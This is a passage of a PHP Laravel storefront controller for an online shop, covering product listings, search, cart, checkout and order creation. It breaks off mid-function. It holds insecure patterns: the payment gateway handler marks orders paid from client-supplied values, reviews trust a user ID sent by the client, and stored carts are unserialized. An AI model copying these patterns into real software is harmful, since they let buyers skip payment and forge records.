<?php

namespace App\Http\Controllers;

use App\Advertise;
use App\Banner;
use App\Http\Helper\ApiResource;
use App\Services\CategoryService;
use App\Smimage;
use Illuminate\Support\Facades\DB;
use App\Blog;
use App\EorangeCategory;
use App\Brand;
use App\Cart;
use App\Category;
use App\Childcategory;
use App\Classes\GeniusMailer;
use App\Compare;
use App\Conversation;
use App\Counter;
use App\Coupon;
use App\Currency;
use App\Faq;
use App\Generalsetting;
use App\Image;
use App\Language;
use App\Message;
use App\Notification;
use App\Order;
use App\Page;
use App\Pagesetting;
use App\PaymentGateway;
use App\Pickup;
use App\Portfolio;
use App\Product;
use App\ProductClick;
use App\Review;
use App\Service;
use App\Slider;
use App\Subcategory;
use App\Subscriber;
use App\User;
use App\UserNotification;
use App\VendorOrder;
use Auth;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Session;
use Illuminate\Support\Str;
use InvalidArgumentException;
use Markury\MarkuryPost;

class FrontendController extends Controller
{

    public function __construct()
    {
        $this->auth_guests();
        if (isset($_SERVER['HTTP_REFERER'])) {
            $referral = parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST);
            if ($referral != $_SERVER['SERVER_NAME']) {

                $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
                if ($brwsr->count() > 0) {
                    $brwsr = $brwsr->first();
                    $tbrwsr['total_count'] = $brwsr->total_count + 1;
                    $brwsr->update($tbrwsr);
                } else {
                    $newbrws = new Counter();
                    $newbrws['referral'] = $this->getOS();
                    $newbrws['type'] = "browser";
                    $newbrws['total_count'] = 1;
                    $newbrws->save();
                }

                $count = Counter::where('referral', $referral);
                if ($count->count() > 0) {
                    $counts = $count->first();
                    $tcount['total_count'] = $counts->total_count + 1;
                    $counts->update($tcount);
                } else {
                    $newcount = new Counter();
                    $newcount['referral'] = $referral;
                    $newcount['total_count'] = 1;
                    $newcount->save();
                }
            }
        } else {
            $brwsr = Counter::where('type', 'browser')->where('referral', $this->getOS());
            if ($brwsr->count() > 0) {
                $brwsr = $brwsr->first();
                $tbrwsr['total_count'] = $brwsr->total_count + 1;
                $brwsr->update($tbrwsr);
            } else {
                $newbrws = new Counter();
                $newbrws['referral'] = $this->getOS();
                $newbrws['type'] = "browser";
                $newbrws['total_count'] = 1;
                $newbrws->save();
            }
        }
    }


    function getOS()
    {

        $user_agent = $_SERVER['HTTP_USER_AGENT'];

        $os_platform = "Unknown OS Platform";

        $os_array = array(
            '/windows nt 10/i' => 'Windows 10',
            '/windows nt 6.3/i' => 'Windows 8.1',
            '/windows nt 6.2/i' => 'Windows 8',
            '/windows nt 6.1/i' => 'Windows 7',
            '/windows nt 6.0/i' => 'Windows Vista',
            '/windows nt 5.2/i' => 'Windows Server 2003/XP x64',
            '/windows nt 5.1/i' => 'Windows XP',
            '/windows xp/i' => 'Windows XP',
            '/windows nt 5.0/i' => 'Windows 2000',
            '/windows me/i' => 'Windows ME',
            '/win98/i' => 'Windows 98',
            '/win95/i' => 'Windows 95',
            '/win16/i' => 'Windows 3.11',
            '/macintosh|mac os x/i' => 'Mac OS X',
            '/mac_powerpc/i' => 'Mac OS 9',
            '/linux/i' => 'Linux',
            '/ubuntu/i' => 'Ubuntu',
            '/iphone/i' => 'iPhone',
            '/ipod/i' => 'iPod',
            '/ipad/i' => 'iPad',
            '/android/i' => 'Android',
            '/blackberry/i' => 'BlackBerry',
            '/webos/i' => 'Mobile'
        );

        foreach ($os_array as $regex => $value) {

            if (preg_match($regex, $user_agent)) {
                $os_platform = $value;
            }

        }
        return $os_platform;
    }
public function topPicks($day){
    $to = Carbon::now();
        $from = Carbon::now()->subDays($day);
    $data=collect([]);
    $order = Order::whereBetween('created_at', [$from, $to])->get()->map(function ($item,$key) use($data){
        foreach (unserialize(bzdecompress(utf8_decode($item->cart)))->items as $prod){
            $data->push([
               'product_id'=>$prod['item']->id,
               'qty'=>$prod['qty'],
            ]);
        }
    });
    $products = collect([]);
    foreach ($data->groupBy('product_id') as $key=>$pro){

        if($product = Product::where('id',$key)->first()){
            $product['count'] = $pro->sum('qty');
            $products->push($product);
        }

    }
    return $products->sortBy('count')->reverse()->take(4);
}
    public function index(Request $request)
    {
        $categoryWiseProduct = EorangeCategory::with(['subCategory', "products" => function ($query) {
            $query->orderBy('id','desc');
        }])->whereNull('parent_id')->get();

        $flashSell = Product::latest()->where('flashsale', 1)->take(8)->get();

        $eorangMall = Product::latest()->where('eorangemall', 1)->take(6)->get();

        $orangBasket = Product::latest()->whereHas('category',function($q){
            $q->where('slug','orange-grocery');
    })->take(6)->get();
        $weekly_picks = $this->topPicks(7);
        if (!empty($request->reff)) {
            $affilate_user = User::where('affilate_code', '=', $request->reff)->first();
            if (!empty($affilate_user)) {
                $gs = Generalsetting::findOrFail(1);
                if ($gs->is_affilate == 1) {
                    Session::put('affilate', $affilate_user->id);
                    return redirect()->route('front.index');
                }

            }

        }

        $ads = Portfolio::all();
        $sliders = Slider::all();
        $brands = Brand::all();
        $fproducts = Product::where('featured', '=', 1)->where('status', '=', 1)->orderBy('id', 'desc')->take(10)->get();
        $imgs = Image::all();
        $smimgs = Smimage::all();
        return view('front.index', compact('flashSell','weekly_picks', 'categoryWiseProduct', 'ads', 'sls', 'sliders', 'brands', 'imgs', 'eorangMall', 'orangBasket', 'smimgs'));
    }

   public function load_more_data(Request $request,CategoryService $categoryService){
       $gs = Generalsetting::findOrFail(1);
       if (Session::has('currency')){
          $curr =$categoryService->getCurrency(Session::get('currency'));
       }else{
           $curr =$categoryService->defaultCurrency();
       }
        if($request->ajax()) {
            if ($request->id > 0) {
                $data = Product::recommendYou()->where('id', '<', $request->id)
                    ->orderBy('id', 'DESC')
                    ->limit(6)
                    ->get()->map(function ($item) use ($gs, $curr) {
                        $name = str_replace(" ", "-", $item->name);
                        if ($item->user_id != 0) {
                            $price = $item->cprice + $gs->fixed_commission + ($item->cprice / 100) * $gs->percentage_commission;
                            $p_price = round($price * $curr->value, 2);
                        } else {
                            $p_price = round($item->cprice * $curr->value, 2);
                        }
                        $item['resource'] = [
                            'url' => route('front.product', ['id' => $item->id, 'slug' => Str::slug($name)]),
                            'is_new' => $item->isNew() ? 1 : 0,
                            'offPrice' => [
                                'status' => $item->offPrice()['off_price'] ? 1 : 0,
                                'off_percent' => $item->offPrice()['off_percent']
                            ],
                            'image' => asset('assets/images/' . $item->photo),
                            'title' => str_limit($item->name, 50),
                            'cur' => $gs->sign == 0 ? $curr->sign : "",
                            'price' => $p_price,
                            'isStockOut' => $item->isStockOut(),
                            'off_price'=> $item->offPrice()['off_price']?round($item->pprice * $curr->value, 2):0
                        ];
                        return $item;
                    });
            } else {
                $data = Product::recommendYou()->orderBy('id', 'DESC')
                    ->limit(24)
                    ->get()->map(function ($item) use ($gs, $curr) {
                        $name = str_replace(" ", "-", $item->name);
                        if ($item->user_id != 0) {
                            $price = $item->cprice + $gs->fixed_commission + ($item->cprice / 100) * $gs->percentage_commission;
                            $p_price = round($price * $curr->value, 2);
                        } else {
                            $p_price = round($item->cprice * $curr->value, 2);
                        }
                        $item['resource'] = [
                            'url' => route('front.product', ['id' => $item->id, 'slug' => Str::slug($name)]),
                            'is_new' => $item->isNew() ? 1 : 0,
                            'offPrice' => [
                                'status' => $item->offPrice()['off_price'] ? 1 : 0,
                                'off_percent' => $item->offPrice()['off_percent']
                            ],
                            'image' => asset('assets/images/' . $item->photo),
                            'title' => str_limit($item->name, 50),
                            'cur' => $gs->sign == 0 ? $curr->sign : "",
                            'price' => $p_price,
                            'isStockOut' => $item->isStockOut(),
                            'off_price'=> $item->offPrice()['off_price']?round($item->pprice * $curr->value, 2):0

                        ];
                        return $item;
                    });
            }
            return response()->json([
                'data' => $data,
                'last_id' => $data->count() ? $data->last()->id : null,
                'count' => $data->count()
            ]);
        }

    }

    public function lang($id)
    {
        Session::put('language', $id);
        return redirect()->back();
    }


    public function currency($id)
    {
        Session::put('currency', $id);
        return redirect()->back();
    }

    public function category(Request $request, $slug)
    {

        $banner = Banner::findOrFail(1);
        $sort = "";

        $cat = Category::where('cat_slug', '=', $slug)->first();
        $cats = $cat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $cats = $cat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.category', compact('cat', 'cats', 'sort', 'min', 'max', 'banner'));
        }
        return view('front.category', compact('cat', 'sort', 'cats', 'banner'));
    }

    public function categorysort($slug, $sorted)
    {
        $banner = Banner::findOrFail(1);
        $sort = $sorted;

        $cat = Category::where('cat_slug', '=', $slug)->first();
        if ($sort == "new") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $cats = $cat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $cats = $cat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.category', compact('cat', 'cats', 'sort', 'banner'));
    }

    public function subcategory(Request $request, $slug)
    {
        $sort = "";
        $banner = Banner::findOrFail(1);
        $subcat = Subcategory::where('sub_slug', '=', $slug)->first();
        $subcats = $subcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $subcats = $subcat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.subcategory', compact('subcat', 'subcats', 'sort', 'min', 'max', 'banner'));
        }

        return view('front.subcategory', compact('subcat', 'sort', 'subcats', 'banner'));
    }

    public function subcategorysort($slug, $sorted)
    {
        $sort = $sorted;
        $banner = Banner::findOrFail(1);
        $subcat = Subcategory::where('sub_slug', '=', $slug)->first();
        if ($sort == "new") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $subcats = $subcat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $subcats = $subcat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.subcategory', compact('subcat', 'subcats', 'sort', 'banner'));
    }

    public function childcategory(Request $request, $slug)
    {
        $sort = "";
        $banner = Banner::findOrFail(1);
        $childcat = Childcategory::where('child_slug', '=', $slug)->first();
        $childcats = $childcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        if (!empty($request->min) || !empty($request->max)) {
            $min = $request->min;
            $max = $request->max;
            $childcats = $childcat->products()->where('status', '=', 1)->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
            return view('front.childcategory', compact('childcat', 'childcats', 'sort', 'min', 'max', 'banner'));
        }

        return view('front.childcategory', compact('childcat', 'childcats', 'sort', 'banner'));
    }

    public function childcategorysort($slug, $sorted)
    {
        $sort = $sorted;
        $banner = Banner::findOrFail(1);
        $childcat = Childcategory::where('child_slug', '=', $slug)->first();
        if ($sort == "new") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            $childcats = $childcat->products()->where('status', '=', 1)->paginate(9);
        } else if ($sort == "low") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            $childcats = $childcat->products()->where('status', '=', 1)->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.childcategory', compact('childcat', 'childcats', 'sort', 'banner'));
    }

    public function product($id, $slug)
    {


        $banner = Banner::findOrFail(1);
        $product = Product::with('latestcategory', 'avgRating', 'brandinfo')->findOrFail($id);
        if($product->exclusive_offer){
            if(!\request()->exclusive_offer) {
                abort(404);
            }
        }


        $relatedProduct = [];
        if (count($product->latestcategory) > 0) {
            $relatedProduct = Product::with('avgRating')->categorized($product->latestcategory->pluck('id'))->take(5)->get();

        }

        if ($product->size != null) {
            $size = explode(',', $product->size);
        }
        if ($product->color != null) {
            $color = explode(',', $product->color);
        }
        $product->views += 1;
        $product->update();
        $pmeta = $product->tags;
        return view('front.product', compact('product', 'relatedProduct', 'size', 'pmeta', 'color', 'banner'));
    }

    public function cart()
    {
        if (!Session::has('cart')) {
            return view('front.cart');
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        $products = $cart->items;
        return view('front.cart', ['products' => $cart->items, 'totalPrice' => $cart->totalPrice]);
    }

    //Submit Review
    //Submit Review
    public function reviewsubmit(Request $request)
    {
        $ck = 0;
        $orders = Order::where('user_id', '=', $request->user_id)->where('status', '=', 'completed')->get();

        foreach ($orders as $order) {
            $cart = unserialize($order->cart);
            foreach ($cart->items as $product) {
                if ($request->product_id == $product['item']['id']) {
                    $ck = 1;
                    break;
                }
            }
        }
        if ($ck == 1) {
            $review = new Review;
            $review->fill($request->all());
            $review['review_date'] = date('Y-m-d H:i:s');
            $review->save();
            return redirect()->back()->with('success', 'Your Review Submitted Successfully.');
        } else {
            return redirect()->back()->with('unsuccess', 'Buy This Product First');
        }


    }

    //Submit Review
    public function tags($tag)
    {
        $products = Product::where('tags', 'like', '%' . $tag . '%')
            ->where('status', '=', 1)->paginate(9);
        return view('front.tags', compact('products', 'tag'));
    }

    public function search(Request $request)
    {
        $sort = "";
        $search = $request->product;
        $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
            ->paginate(9);
//        dd($sproducts);
        return view('front.searchproduct', compact('sproducts', 'search', 'sort'));
    }

    public function searchs(Request $request, $search)
    {
        $sort = "";
        $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
            ->paginate(9);
        $min = $request->min;
        $max = $request->max;
        $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);
        return view('front.searchproductprice', compact('sproducts', 'search', 'sort', 'min', 'max'));
    }

    public function searchss(Request $request, $search, $sort)
    {
        if ($sort == "new") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('id', 'desc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('id', 'desc')->paginate(9);
        } else if ($sort == "old") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->paginate(9);
        } else if ($sort == "low") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'asc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice', 'asc')->paginate(9);
        } else if ($sort == "high") {
            if (!empty($request->min) || !empty($request->max)) {
                $min = $request->min;
                $max = $request->max;
                $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')->whereBetween('cprice', [$min, $max])->orderBy('cprice', 'desc')->paginate(9);

                return view('front.searchpricesort', compact('sproducts', 'search', 'sort', 'min', 'max'));
            }
            $sproducts = Product::where('status', '=', 1)->where('name', 'like', '%' . $search . '%')
                ->orderBy('cprice', 'desc')->paginate(9);
        }
        return view('front.searchproductsort', compact('sproducts', 'search', 'sort'));
    }

    public function payment($order_number)
    {
        if(!$order = Order::where('order_number',$order_number)
            ->where('payment_status','Pending')
            ->where('user_id',auth()->user()->id)
            ->first()){

            return redirect()->route('front.index');
        }
//        dd($order);
        return view('front.payment',compact('order'));
    }
    public function orderNote(Request $request,$order_number)
    {
        if(!$order = Order::where('order_number',$order_number)
            ->where('payment_status','Pending')
            ->where('user_id',auth()->user()->id)
            ->first()){

            return redirect()->route('front.index');
        }
        $order->order_note = $request->order_note;
        $order->save();
        return redirect()->back()->with('success','Save successful');
    }
    public function orderCancel(Request $request,$order_number)
    {
        if(!$order = Order::where('order_number',$order_number)
            ->where('payment_status','Pending')
            ->where('user_id',auth()->user()->id)
            ->first()){

            return redirect()->route('front.index');
        }
        $order->status = 'declined';
        $order->save();
        return redirect()->back()->with('success','Cancel successful');
    }

    public function checkout()
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success', "You don't have any product to checkout.");
        }
        if (Session::has('already')) {
            Session::forget('already');
        }
        $gateways = PaymentGateway::where('status', '=', 1)->get();
        $gs = Generalsetting::findOrFail(1);
        $pickups = Pickup::all();
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        $products = $cart->items;
        if ($gs->multiple_ship == 1) {
            $user = null;
            foreach ($cart->items as $prod) {
                $user[] = $prod['item']['user_id'];
            }
            $ship = 0;
            $users = array_unique($user);
            if (!empty($users)) {
                foreach ($users as $user) {
                    if ($user != 0) {
                        $nship = User::findOrFail($user);
                        $ship += $nship->shipping_cost;
                    } else {
                        $ship += $gs->ship;
                    }

                }
            }

        } else {
            $ship = $gs->ship;
        }

        $total = $cart->totalPrice + $ship;
        if ($gs->tax != 0) {
            $tax = ($total / 100) * $gs->tax;
            $total = $total + $tax;
        }

        return view('front.checkout', ['products' => $cart->items, 'totalPrice' => $total, 'pickups' => $pickups, 'totalQty' => $cart->totalQty, 'gateways' => $gateways, 'shipping_cost' => $ship]);
    }

    public function cashondelivery(Request $request)
    {
        if (!Session::has('cart')) {
            return redirect()->route('front.index')->with('success', "You don't have any product to checkout.");
        }
        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }
        $gs = Generalsetting::findOrFail(1);
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        $settings = Generalsetting::findOrFail(1);

        $order = new Order;
        $order['user_id'] = auth()->guard('user')->user()->id;
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9));
        $order['totalQty'] = $cart->totalQty;

        $order['method'] = "Cash On Delivery";
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;

        $order['tax'] = $request->tax?$request->tax:0;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = $order->generateOrderNo();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shippingCheck?$request->shipping_email:$request->email;
        $order['shipping_name'] = $request->shippingCheck?$request->shipping_name:$request->name;
        $order['shipping_phone'] = $request->shippingCheck?$request->shipping_phone:$request->phone;
        $order['shipping_address'] = $request->shippingCheck?$request->shipping_address:$request->address;
        $order['shipping_country'] = $request->shippingCheck?$request->shipping_country:$request->customer_country;
        $order['shipping_city'] = $request->shippingCheck?$request->shipping_city:$request->city;
        $order['shipping_zip'] = $request->shippingCheck?$request->shipping_zip:$request->zip;
        $order['order_note'] = $request->order_notes;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['payment_status'] = "Pending";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        $order['pay_amount'] = $cart->totalPrice;
        $shipping_cost = $cart->totalPrice >= 1000?30:50;
        if($order['shipping_city'] == 2){
            $shipping_cost = $cart->totalPrice >= 1000?80:100;
        }
        $order['shipping_cost'] = $shipping_cost;


        if (Session::has('affilate')) {
            $val = $request->total / 100;
            $sub = $val * $gs->affilate_charge;
            $user = User::findOrFail(Session::get('affilate'));
            $user->affilate_income = $sub;
            $user->update();
            $order['affilate_user'] = $user->name;
            $order['affilate_charge'] = $sub;
        }
//        dd($cart);
//        dd($order);
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        if ($request->coupon_id != "") {
            $coupon = Coupon::findOrFail($request->coupon_id);
            $coupon->used++;
            if ($coupon->times != null) {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();

        }
        foreach ($cart->items as $prod) {
            $x = (string)$prod['stock'];
            if ($x != null) {

                $product = Product::findOrFail($prod['item']['id']);
                if($product->exclusive_offer){
                   $user = auth()->user();
                   $user->is_exclusive_offer = 1;
                   $user->save();
                }
                $product->stock = $prod['stock'];
                $product->update();
                if ($product->stock <= 5) {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                }
            }
        }
        foreach ($cart->items as $prod) {
            if ($prod['item']['user_id'] != 0) {
                $vorder = new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;
                $vorder->save();
            }

        }
        Session::forget('cart');

        //Sending Email To Buyer
        $to = $request->email;
        $subject = "Your Order Placed!!";
        $msg = "Hello " . $request->name . "!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
        $headers = "From: " . $settings->title . "<" . $settings->email . ">";
//        mail($to, $subject, $msg, $headers);

        //Sending Email To Admin
        $to = $settings->email;
        $subject = "New Order Recieved!!";
        $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
        $headers = "From: " . $settings->title . "<" . $settings->email . ">";
//        mail($to, $subject, $msg, $headers);

        return redirect()->route('front.payment',$order->order_number);
    }

    public function gateway(Request $request)
    {
        $gs = 0;

        if (!Session::has('cart')) {
            return redirect()->route('front.cart')->with('success', "You don't have any product to checkout.");
        }
        $oldCart = Session::get('cart');
        $cart = new Cart($oldCart);
        if (Session::has('currency')) {
            $curr = Currency::find(Session::get('currency'));
        } else {
            $curr = Currency::where('is_default', '=', 1)->first();
        }
        $settings = Generalsetting::findOrFail(1);
        $order = new Order;
        $success_url = action('PaymentController@payreturn');
        $item_name = $settings->title . " Order";
        $item_number = str_random(4) . time();
        $order['user_id'] = $request->user_id;
        $order['cart'] = utf8_encode(bzcompress(serialize($cart), 9));
        $order['totalQty'] = $request->totalQty;
        $order['pay_amount'] = $request->total;
        $method = PaymentGateway::findOrFail($request->paymenttype);
        $order['method'] = $method->title;
        $order['shipping'] = $request->shipping;
        $order['pickup_location'] = $request->pickup_location;
        $order['customer_email'] = $request->email;
        $order['customer_name'] = $request->name;
        $order['shipping_cost'] = $request->shipping_cost;
        $order['tax'] = $request->tax;
        $order['customer_phone'] = $request->phone;
        $order['order_number'] = str_random(4) . time();
        $order['customer_address'] = $request->address;
        $order['customer_country'] = $request->customer_country;
        $order['customer_city'] = $request->city;
        $order['customer_zip'] = $request->zip;
        $order['shipping_email'] = $request->shipping_email;
        $order['shipping_name'] = $request->shipping_name;
        $order['shipping_phone'] = $request->shipping_phone;
        $order['shipping_address'] = $request->shipping_address;
        $order['shipping_country'] = $request->shipping_country;
        $order['shipping_city'] = $request->shipping_city;
        $order['shipping_zip'] = $request->shipping_zip;
        $order['order_note'] = $request->order_notes;
        $order['txnid'] = $request->txn_id4;
        $order['coupon_code'] = $request->coupon_code;
        $order['coupon_discount'] = $request->coupon_discount;
        $order['payment_status'] = "Completed";
        $order['currency_sign'] = $curr->sign;
        $order['currency_value'] = $curr->value;
        if (Session::has('affilate')) {
            $val = $request->total / 100;
            $sub = $val * $gs->affilate_charge;
            $user = User::findOrFail(Session::get('affilate'));
            $user->affilate_income = $sub;
            $user->update();
            $order['affilate_user'] = $user->name;
            $order['affilate_charge'] = $sub;
        }
        $order->save();
        $notification = new Notification;
        $notification->order_id = $order->id;
        $notification->save();
        if ($request->coupon_id != "") {
            $coupon = Coupon::findOrFail($request->coupon_id);
            $coupon->used++;
            if ($coupon->times != null) {
                $i = (int)$coupon->times;
                $i--;
                $coupon->times = (string)$i;
            }
            $coupon->update();

        }
        foreach ($cart->items as $prod) {
            $x = (string)$prod['stock'];
            if ($x != null) {
                $product = Product::findOrFail($prod['item']['id']);
                $product->stock = $prod['stock'];
                $product->update();
                if ($product->stock <= 5) {
                    $notification = new Notification;
                    $notification->product_id = $product->id;
                    $notification->save();
                }
            }
        }
        foreach ($cart->items as $prod) {
            if ($prod['item']['user_id'] != 0) {
                $vorder = new VendorOrder;
                $vorder->order_id = $order->id;
                $vorder->user_id = $prod['item']['user_id'];
                $vorder->qty = $prod['qty'];
                $vorder->price = $prod['price'];
                $vorder->order_number = $order->order_number;
                $vorder->save();
            }

        }
        Session::forget('cart');

        //Sending Email To Buyer
        $to = $request->email;
        $subject = "Your Order Placed!!";
        $msg = "Hello " . $request->name . "!\nYou have placed a new order. Please wait for your delivery. \nThank you.";
        $headers = "From: " . $settings->title . "<" . $settings->email . ">";
        mail($to, $subject, $msg, $headers);

        //Sending Email To Admin
        $to = $settings->email;
        $subject = "New Order Recieved!!";
        $msg = "Hello Admin!\nYour store has recieved a new order. Please login to your panel to check. \nThank you.";
        $headers = "From: " . $settings->title . "<" . $settings->email . ">";
        mail($to, $subject, $msg, $headers);

        return redirect($success_url);
    }

    public function user($id)
    {
        $user = User::findOrFail($id);
        if ($user->title != null && $user->details != null) {
            $title = explode(',', $user->title);
            $details = explode(',', $user->details);
        }
        return view('front.user', compact('user', 'title', 'details'));

    }

    public function ads($id)
    {
        $ad = Advertise::findOrFail($id);
        $old = $ad->clicks;
        $new = $old + 1;
        $ad->clicks = $new;
        $ad->update();
        return redirect($ad->url);

    }

    public function types($slug)
    {
        $cats = Category::all();
        $cat = Category::where('cat_slug', '=', $slug)->first();
        $users = User::where('category_id', '=', $cat->id)->where('active', '=', 1)->paginate(8);
        $userss = User::all();
        $city = null;
        foreach ($userss as $user) {
            $city[] = $user->city;
        }
        $cities = array_unique($city);
        return view('front.typeuser', compact('users', 'cats', 'cat', 'cities'));

    }

    function finalize()
    {
        $actual_path = str_replace('project', '', base_path());
        $dir = $actual_path . 'install';
        $this->deleteDir($dir);
        return redirect('/');
    }

    function auth_guests()
    {
        $chk = MarkuryPost::marcuryBase();
        $chkData = MarkuryPost::marcurryBase();
        $actual_path = str_replace('project', '', base_path());
        if ($chk != MarkuryPost::maarcuryBase()) {
            if ($chkData < date('Y-m-d')) {
                if (is_dir($actual_path . '/install')) {
                    header("Location: " . url('/install'));
                    die();
                } else {
                    echo MarkuryPost::marcuryBasee();
                    die();
                }
            }
        }
    }

    public function blog()
    {
        $blogs = Blog::orderBy('created_at', 'desc')->paginate(6);
        return view('front.blog', compact('blogs'));

    }

    public function subscribe(Request $request)
    {
        $this->validate($request, array(
            'email' => 'unique:subscribers',
        ));
        $subscribe = new Subscriber;
        $subscribe->fill($request->all());
        $subscribe->save();
        Session::flash('subscribe', 'You are subscribed Successfully.');
        return redirect()->back();
    }

    public function blogshow($id)
    {
        $this->code_image();
        $blog = Blog::findOrFail($id);
        $old = $blog->views;
        $new = $old + 1;
        $blog->views = $new;
        $blog->update();
        $lblogs = Blog::orderBy('created_at', 'desc')->limit(10)->get();
        return view('front.blogshow', compact('blog', 'lblogs'));

    }

    public function faq()
    {
        $ps = Pagesetting::findOrFail(1);
        if ($ps->f_status == 0) {
            return redirect()->route('front.index');
        }
        $fq = Faq::orderBy('id', 'desc')->first();
        $id1 = $fq->id;
        $faqs = Faq::where('id', '<', $id1)->orderBy('id', 'desc')->get();
        return view('front.faq', compact('fq', 'faqs'));
    }

    // Footer Static Nav page methods
    public function helpandsupport()
    {
        return view('front.helpandsupport');
    }

    public function privacyPolicy()
    {
        return view('front.privacy_policy');
    }

    public function termsOrCondition()
    {
        return view('front.terms_or_condition');
    }

    public function gettoknowus()
    {
        return view('front.gettoknowus');
    }

    public function emiPolicy()
    {
        return view('front.emi_policy');
    }

    public function returnPolicy()
    {
        return view('front.return_policy');
    }

    public function page($slug)
    {
        $page = Page::where('slug', '=', $slug)->first();
        return view('front.page', compact('page'));
    }

    public function contact()
    {
        $this->code_image();
        $ps = Pagesetting::findOrFail(1);
        if ($ps->c_status == 0) {
            return redirect()->route('front.index');
        }
        return view('front.contact', compact('ps'));
    }


    //Send email to user
    public function vendorcontact(Request $request)
    {
        $user = User::findOrFail($request->user_id);
        $vendor = User::findOrFail($request->vendor_id);
        $subject = $request->subject;
        $to = $vendor->email;
        $name = $request->name;
        $from = $request->email;
        $msg = "Name: " . $name . "\nEmail: " . $from . "\nMessage: " . $request->message;
        mail($to, $subject, $msg);
        $conv = Conversation::where('sent_user', '=', $user->id)->where('subject', '=', $subject)->first();
        if (isset($conv)) {
            $msg = new Message();
            $msg->conversation_id = $conv->id;
            $msg->message = $request->message;
            $msg->sent_user = $user->id;
            $msg->save();
        } else {
            $message = new Conversation();
            $message->subject = $subject;
            $message->sent_user = $request->user_id;
            $message->recieved_user = $request->vendor_id;
            $message->message = $request->message;
            $message->save();
            $notification = new UserNotification;
            $notification->user_id = $request->vendor_id;
            $notification->conversation_id = $message->id;
            $notification->save();
            $msg = new Message();
            $msg->conversation_id = $message->id;
            $msg->message = $request->message;
            $msg->sent_user = $request->user_id;;
